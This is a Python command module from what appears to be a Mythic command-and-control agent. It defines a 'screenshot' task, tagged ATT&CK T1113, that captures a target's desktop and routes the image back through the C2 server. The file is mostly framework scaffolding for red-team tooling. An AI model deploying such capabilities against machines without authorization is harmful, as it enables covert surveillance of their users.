from mythic_payloadtype_container.MythicCommandBase import *
from uuid import uuid4
import json
from os import path
from mythic_payloadtype_container.MythicRPC import *
from sRDI import ShellcodeRDI
import base64

class ScreenshotArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Take a screenshot of the current desktop."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@reznok, @djhohnstein"
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="screenshot", author="@djhohnstein", for_new_ui=True)
    attackmapping = ["T1113"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        # task.completed_callback_function = self.screenshot_completed
        return task

    async def process_response(self, response: AgentResponse):
        pass

    async def screenshot_completed(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
        if task.completed and task.status != MythicStatus.Error:
            responses = await MythicRPC().execute(
                "get_responses",
                task_id=task.id,
            )
            if responses.status != MythicStatus.Success:
                raise Exception("Failed to get responses from task")
            file_id = ""
            for f in responses.response["files"]:
                if "agent_file_id" in f.keys() and f["agent_file_id"] != "" and f["agent_file_id"] != None:
                    file_id = f["agent_file_id"]
                    break
            if file_id == "":
                raise Exception("Screenshot completed successfully, but no files had an agent_file_id")
            else:
                resp = await MythicRPC().execute(
                    "create_output",
                    task_id=task.id,
                    output=file_id)
                if resp.status != MythicStatus.Success:
                    raise Exception("Failed to create output")

        return task
